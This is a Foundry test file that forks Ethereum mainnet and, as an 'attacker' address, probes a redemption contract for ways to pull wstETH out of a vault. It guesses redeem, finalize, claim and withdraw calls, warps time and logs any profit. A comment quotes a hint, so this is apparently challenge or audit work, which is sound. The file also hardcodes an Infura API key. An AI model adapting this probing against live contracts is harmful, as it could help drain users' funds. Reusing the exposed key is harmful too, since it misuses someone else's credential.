// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import "forge-std/Test.sol";

interface IERC20 {
    function balanceOf(address) external view returns (uint256);
    function approve(address, uint256) external returns (bool);
    function transfer(address, uint256) external returns (bool);
}

contract RedeemSuccessFollow is Test {
    address constant REDEMPTION_0 = 0xcd63a29FAfF07130d3Af89bB4f40778938AaBB85;
    address constant REDEMPTION_1 = 0x829525417Cd78CBa0f99A8736426fC299506C0d6;
    address constant REDEMPTION_CONTROLLER = 0xdF2eE409BEe416A53b5C040d8e6dAD4a7cEb2510;
    address constant VAULT = 0x551d155760ae96050439AD24Ae98A96c765d761B;
    address constant wstETH = 0x7f39C581F595B53c5cb19bD0b3f8dA6c935E2Ca0;
    address constant IAU = 0x1B6238E95bBCABEE58997c99BaDD4154ad68BA92;
    address constant TASSET = 0xD11c452fc99cF405034ee446803b6F6c1F6d5ED8;

    string RPC_URL = "https://mainnet.infura.io/v3/bfc7283659224dd6b5124ebbc2b14e2c";
    address attacker;

    function setUp() public {
        vm.createSelectFork(RPC_URL);
        attacker = makeAddr("attacker");
        vm.deal(attacker, 100 ether);
    }

    function test_FullRedemptionFlow() public {
        console.log("=== FULL REDEMPTION FLOW TEST ===\n");

        uint256 vaultBefore = IERC20(wstETH).balanceOf(VAULT);
        uint256 attackerWstBefore = IERC20(wstETH).balanceOf(attacker);

        console.log("Vault wstETH before:", vaultBefore / 1e18);
        console.log("Attacker wstETH before:", attackerWstBefore);

        vm.startPrank(attacker);

        // Give attacker TASSET
        deal(TASSET, attacker, 100000e18);
        IERC20(TASSET).approve(REDEMPTION_0, type(uint256).max);

        uint256 attackerTASSET = IERC20(TASSET).balanceOf(attacker);
        console.log("Attacker TASSET:", attackerTASSET / 1e18);

        // Step 1: Redeem TASSET
        console.log("\n=== STEP 1: REDEEM ===");
        (bool s1, bytes memory d1) = REDEMPTION_0.call(
            abi.encodeWithSignature("redeem(uint96)", uint96(1000e18))
        );
        console.log("redeem success:", s1);
        if (!s1 && d1.length >= 4) {
            console.log("Error:");
            console.logBytes4(bytes4(d1));
        }

        // Check state after redeem
        uint256 attackerTASSETAfter = IERC20(TASSET).balanceOf(attacker);
        console.log("Attacker TASSET after:", attackerTASSETAfter / 1e18);
        console.log("TASSET burned:", (attackerTASSET - attackerTASSETAfter) / 1e18);

        // Step 2: Check for pending redemption
        console.log("\n=== STEP 2: CHECK PENDING ===");
        (bool s2, bytes memory d2) = REDEMPTION_0.staticcall(
            abi.encodeWithSignature("pendingRedemption(address)", attacker)
        );
        if (s2 && d2.length >= 32) {
            console.log("pendingRedemption:", abi.decode(d2, (uint256)) / 1e18);
        }

        (bool s3, bytes memory d3) = REDEMPTION_0.staticcall(
            abi.encodeWithSignature("userRedemption(address,uint256)", attacker, 0)
        );
        if (s3 && d3.length >= 32) {
            console.log("userRedemption(0) returned data");
        }

        // Check totalRedeeming
        (bool s4, bytes memory d4) = REDEMPTION_0.staticcall(
            abi.encodeWithSignature("totalRedeeming()")
        );
        if (s4 && d4.length >= 32) {
            console.log("totalRedeeming:", abi.decode(d4, (uint256)) / 1e18);
        }

        // Step 3: Try to finalize
        console.log("\n=== STEP 3: FINALIZE ===");

        (bool s5, bytes memory d5) = REDEMPTION_0.call(
            abi.encodeWithSignature("finalizeRedeem(uint256)", 0)
        );
        console.log("finalizeRedeem(0):", s5);
        if (!s5 && d5.length >= 4) {
            console.log("Error:");
            console.logBytes4(bytes4(d5));
        }

        (bool s6, bytes memory d6) = REDEMPTION_0.call(
            abi.encodeWithSignature("claimRedeem(uint256)", 0)
        );
        console.log("claimRedeem(0):", s6);
        if (!s6 && d6.length >= 4) {
            console.log("Error:");
            console.logBytes4(bytes4(d6));
        }

        (bool s7, bytes memory d7) = REDEMPTION_0.call(
            abi.encodeWithSignature("claim(uint256)", 0)
        );
        console.log("claim(0):", s7);
        if (!s7 && d7.length >= 4) {
            console.log("Error:");
            console.logBytes4(bytes4(d7));
        }

        // Try R1 finalize functions
        console.log("\nTrying R1 finalize:");
        (bool s8, bytes memory d8) = REDEMPTION_1.call(
            abi.encodeWithSignature("finalizeRedeem(uint256)", 0)
        );
        console.log("R1 finalizeRedeem(0):", s8);
        if (!s8 && d8.length >= 4) {
            console.log("Error:");
            console.logBytes4(bytes4(d8));
        }

        vm.stopPrank();

        // Check final state
        uint256 vaultAfter = IERC20(wstETH).balanceOf(VAULT);
        uint256 attackerWstAfter = IERC20(wstETH).balanceOf(attacker);

        console.log("\n=== FINAL STATE ===");
        console.log("Vault wstETH after:", vaultAfter / 1e18);
        console.log("Vault change:", int256(vaultAfter) - int256(vaultBefore));
        console.log("Attacker wstETH after:", attackerWstAfter);

        if (attackerWstAfter > 0) {
            console.log("\n*** ATTACKER RECEIVED WSTETH! ***");
            console.log("Profit:", attackerWstAfter / 1e18, "wstETH");
            console.log("Value: ~$", (attackerWstAfter * 2300) / 1e18);
        }
    }

    function test_CheckExistingRedemptions() public view {
        console.log("=== CHECKING EXISTING REDEMPTIONS ===\n");

        // The hint "extracting assets to a proxy attacker owns"
        // Maybe we need to check what proxies exist

        (bool s1, bytes memory d1) = REDEMPTION_0.staticcall(
            abi.encodeWithSignature("totalRedeeming()")
        );
        if (s1) {
            console.log("R0 totalRedeeming:", abi.decode(d1, (uint256)) / 1e18);
        }

        // Check R0 storage for pending redemptions
        console.log("\nR0 storage:");
        for (uint i = 0; i < 20; i++) {
            bytes32 slot = vm.load(REDEMPTION_0, bytes32(i));
            if (slot != bytes32(0)) {
                console.log("Slot", i, ":");
                console.logBytes32(slot);
            }
        }
    }

    function test_TryImmediateRedeem() public {
        console.log("=== TRYING IMMEDIATE REDEEM (NO DELAY) ===\n");

        uint256 vaultBefore = IERC20(wstETH).balanceOf(VAULT);

        vm.startPrank(attacker);
        deal(TASSET, attacker, 100000e18);
        IERC20(TASSET).approve(REDEMPTION_0, type(uint256).max);

        // Maybe there's a direct claim/withdraw function
        console.log("Trying direct withdraw functions:");

        (bool s1, bytes memory d1) = REDEMPTION_0.call(
            abi.encodeWithSignature("withdraw(uint256)", 1000e18)
        );
        console.log("withdraw:", s1);

        (bool s2, bytes memory d2) = REDEMPTION_0.call(
            abi.encodeWithSignature("withdrawTo(address,uint256)", attacker, 1000e18)
        );
        console.log("withdrawTo:", s2);

        (bool s3, bytes memory d3) = REDEMPTION_0.call(
            abi.encodeWithSignature("instantRedeem(uint256)", 1000e18)
        );
        console.log("instantRedeem:", s3);

        vm.stopPrank();

        uint256 attackerWst = IERC20(wstETH).balanceOf(attacker);
        console.log("\nAttacker wstETH:", attackerWst);
    }

    function test_RedeemAndWarpTime() public {
        console.log("=== REDEEM AND WARP TIME ===\n");

        uint256 vaultBefore = IERC20(wstETH).balanceOf(VAULT);
        console.log("Vault before:", vaultBefore / 1e18, "wstETH");

        vm.startPrank(attacker);
        deal(TASSET, attacker, 100000e18);
        IERC20(TASSET).approve(REDEMPTION_0, type(uint256).max);

        // Redeem
        (bool s1,) = REDEMPTION_0.call(
            abi.encodeWithSignature("redeem(uint96)", uint96(1000e18))
        );
        console.log("redeem:", s1);

        vm.stopPrank();

        // Warp time forward
        console.log("\nWarping time forward 7 days...");
        vm.warp(block.timestamp + 7 days);

        vm.startPrank(attacker);

        // Try to finalize after time warp
        console.log("\nTrying finalize after time warp:");

        (bool s2, bytes memory d2) = REDEMPTION_0.call(
            abi.encodeWithSignature("finalizeRedeem(uint256)", 0)
        );
        console.log("finalizeRedeem(0):", s2);
        if (!s2 && d2.length >= 4) {
            console.logBytes4(bytes4(d2));
        }

        // Try different finalize calls
        (bool s3, bytes memory d3) = REDEMPTION_0.call(
            abi.encodeWithSignature("processRedeem(address,uint256)", attacker, 0)
        );
        console.log("processRedeem:", s3);

        (bool s4, bytes memory d4) = REDEMPTION_0.call(
            abi.encodeWithSignature("completeRedeem(uint256)", 0)
        );
        console.log("completeRedeem:", s4);

        vm.stopPrank();

        uint256 vaultAfter = IERC20(wstETH).balanceOf(VAULT);
        uint256 attackerWst = IERC20(wstETH).balanceOf(attacker);

        console.log("\nVault after:", vaultAfter / 1e18, "wstETH");
        console.log("Vault change:", int256(vaultBefore) - int256(vaultAfter));
        console.log("Attacker wstETH:", attackerWst);

        if (attackerWst > 0) {
            console.log("\n*** SUCCESS! ***");
        }
    }
}
